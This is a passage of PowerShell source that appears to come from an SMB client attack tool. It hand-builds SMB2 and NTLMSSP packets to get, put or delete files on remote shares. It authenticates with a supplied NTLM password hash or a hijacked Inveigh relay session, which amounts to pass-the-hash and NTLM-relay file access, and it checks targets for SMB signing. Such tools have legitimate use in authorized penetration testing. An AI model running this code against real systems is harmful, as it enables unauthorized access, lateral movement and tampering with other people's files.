        [Byte[]]$desired_access = 0x80,0x00,0x10,0x00
        [Byte[]]$file_attributes = 0x00,0x00,0x00,0x00
        [Byte[]]$share_access = 0x00,0x00,0x00,0x00
        [Byte[]]$create_options = 0x21,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length)

        if($ExtraInfo -eq 1)
        {
            [Byte[]]$create_contexts_length = 0x58,0x00,0x00,0x00
        }
        elseif($ExtraInfo -eq 2)
        {
            [Byte[]]$create_contexts_length = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]$create_contexts_length = 0xb0,0x00,0x00,0x00
            [Byte[]]$allocation_size_bytes = [System.BitConverter]::GetBytes($AllocationSize)
        }

        if($FileName)
        {

            [String]$file_name_padding_check = $FileName.Length / 8

            if($file_name_padding_check -like "*.75")
            {
                $FileName += 0x04,0x00
            }
            elseif($file_name_padding_check -like "*.5")
            {
                $FileName += 0x00,0x00,0x00,0x00
            }
            elseif($file_name_padding_check -like "*.25")
            {
               $FileName += 0x00,0x00,0x00,0x00,0x00,0x00
            }

        }

        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length + 120)

    }
    else
    {
        [Byte[]]$desired_access = 0x03,0x00,0x00,0x00
        [Byte[]]$file_attributes = 0x80,0x00,0x00,0x00
        [Byte[]]$share_access = 0x01,0x00,0x00,0x00
        [Byte[]]$create_options = 0x40,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = 0x00,0x00,0x00,0x00
        [Byte[]]$create_contexts_length = 0x00,0x00,0x00,0x00
    }

    [String]$lease_key = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    [Byte[]]$lease_key = $lease_key.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequest.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequest.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("DesiredAccess",$desired_access)
    $SMB2CreateRequest.Add("FileAttributes",$file_attributes)
    $SMB2CreateRequest.Add("ShareAccess",$share_access)
    $SMB2CreateRequest.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("CreateOptions",$create_options)
    $SMB2CreateRequest.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequest.Add("NameLength",$file_name_length)
    $SMB2CreateRequest.Add("CreateContextsOffset",$create_contexts_offset)
    $SMB2CreateRequest.Add("CreateContextsLength",$create_contexts_length)
    $SMB2CreateRequest.Add("Buffer",$FileName)

    if($ExtraInfo)
    {
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($ExtraInfo -eq 3)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_AllocationSize",$allocation_size_bytes)
        }

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
        }
        
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",$lease_key)
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }

    }

    return $SMB2CreateRequest
}

function New-PacketSMB2FindRequestFile
{
    param ([Byte[]]$FileID,[Byte[]]$Padding)

    $SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_StructureSize",[Byte[]](0x21,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_InfoLevel",[Byte[]](0x25))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_Flags",[Byte[]](0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileIndex",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileID",$FileID)
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Offset",[Byte[]](0x60,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Length",[Byte[]](0x02,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern",[Byte[]](0x2a,0x00))

    if($padding)
    {
        $SMB2FindRequestFile.Add("SMB2FindRequestFile_Padding",$Padding)
    }

    return $SMB2FindRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)
    {
        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
    }

    return $SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Int]$Length,[Int64]$Offset,[Byte[]]$FileID)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)
    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",$length_bytes)
    $SMB2ReadRequest.Add("Offset",$offset_bytes)
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Int]$Length,[Int64]$Offset,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)
    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$length_bytes)
    $SMB2WriteRequest.Add("Offset",$offset_bytes)
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("SMB2WriteRequest_Buffer",$Buffer)

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest()
{
    param([Byte[]]$FileName)

    $file_name_length = [System.BitConverter]::GetBytes($FileName.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Function",[Byte[]](0x94,0x01,0x06,0x00))
    $packet_SMB2IoctlRequest.Add("GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_Length",$file_name_length)
    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_MaxReferralLevel",[Byte[]](0x04,0x00))
    $packet_SMB2IoctlRequest.Add("InData_FileName",$FileName)

    return $packet_SMB2IoctlRequest
}

function New-PacketSMB2SetInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$buffer_length = [System.BitConverter]::GetBytes($Buffer.Count)

    $SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SetInfoRequest.Add("StructureSize",[Byte[]](0x21,0x00))
    $SMB2SetInfoRequest.Add("InfoType",$InfoType)
    $SMB2SetInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2SetInfoRequest.Add("BufferLength",$buffer_length)
    $SMB2SetInfoRequest.Add("BufferOffset",[Byte[]](0x60,0x00))
    $SMB2SetInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2SetInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SetInfoRequest.Add("FileID",$FileID)
    $SMB2SetInfoRequest.Add("Buffer",$Buffer)

    return $SMB2SetInfoRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])
{
    $output_message = "[-] Source must be a byte array when using -Modify"
    $startup_error = $true
}
elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne 'Put' -and $Source -isnot [String]))
{
    $output_message = "[-] Source must be a string"
    $startup_error = $true
}
elseif($Action -eq 'Delete' -and !$Source.StartsWith("\\"))
{
    $output_message = "[-] Source must be a UNC file path"
    $startup_error = $true
}
elseif($Source -is [String])
{
    $source = $Source.Replace('.\','')
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 30000
}

$action_step = 0

if($Action -ne 'Put')
{
    $source = $source.Replace('\\','')
    $source_array = $source.Split('\')
    $target = $source_array[0]
    $share = $source_array[1]
    $source_subdirectory_array = $source.ToCharArray()
    [Array]::Reverse($source_subdirectory_array)
    $source_file = -join($source_subdirectory_array)
    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))
    $source_file_array = $source_file.ToCharArray()
    [Array]::Reverse($source_file_array)
    $source_file = -join($source_file_array)
    $target_share = "\\$target\$share"
}

switch($Action)
{

    'Get'
    {

        if(!$Modify)
        {

            if($destination -and $destination -like '*\*')
            {
                $destination_file_array = $destination.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
                $destination_file_array = $destination_file.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_path = $destination
            }
            elseif($destination)
            {

                if(Test-Path (Join-Path $PWD $destination))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $destination
                }
               
            }
            else
            {

                if(Test-Path (Join-Path $PWD $source_file))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $source_file
                }

            }

        }
        else
        {
            $file_memory = New-Object System.Collections.ArrayList
        }

    }

    'Put'
    {

        if(!$Modify)
        {

            if($source -notlike '*\*')
            {
                $source = Join-Path $PWD $source
            }

            if(Test-Path $source)
            {
                [Int64]$source_file_size = (Get-Item $source).Length
                $source_file = $source

                if($source_file_size -gt 65536)
                {
                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                    $source_file_size_remainder = $source_file_size % 65536
                    $source_file_buffer_size = 65536
                }
                else
                {
                    $source_file_buffer_size = $source_file_size
                }

                $source_file_properties = Get-ItemProperty -path $source_file
                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()
                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))
                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()
                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))
                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()
                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))
                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_change_time = $source_file_last_write_time
                $source_file_buffer = new-object byte[] $source_file_buffer_size
                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)
                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)
            }
            else
            {
                $output_message = "[-] File not found"
                $startup_error = $true
            }

        }
        else
        {
            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)
            {
                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                $source_file_size_remainder = $source_file_size % 65536
                $source_file_buffer_size = 65536
            }
            else
            {
                $source_file_buffer_size = $source_file_size
            }
      
        }

        $destination = $destination.Replace('\\','')
        $destination_array = $destination.Split('\')
        $target = $destination_array[0]
        $share = $destination_array[1]
        $destination_file_array = $destination.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
        $destination_file_array = $destination_file.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
    }

}

if($Action -ne 'Put')
{

    if($source_array.Count -gt 2)
    {
        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)
    }

}
else
{
    
    if($destination_array.Count -gt 2)
    {
        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)
    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))
{
    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($target,"445")
    }
    catch
    {
        $output_message = "[-] $target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    
    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()
        
        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {
            
                switch ($stage)
                {

                    'NegotiateSMB'
                    {          
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
